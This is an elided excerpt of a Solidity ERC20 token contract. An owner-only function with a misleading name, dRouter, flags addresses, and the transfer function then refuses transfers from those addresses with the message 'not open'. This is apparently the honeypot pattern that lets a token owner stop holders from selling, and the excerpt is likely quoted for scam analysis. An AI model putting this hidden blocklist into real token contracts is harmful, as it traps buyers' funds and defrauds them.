...
contract Token is ERC20, Ownable {
    ...
    mapping(address => bool) public _dRouter;
    ...
    function dRouter(address account, bool value) external onlyOwner {
        _dRouter[account] = value;
    }
    ...
    function _transfer(
        ...
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_dRouter[from], "not open");
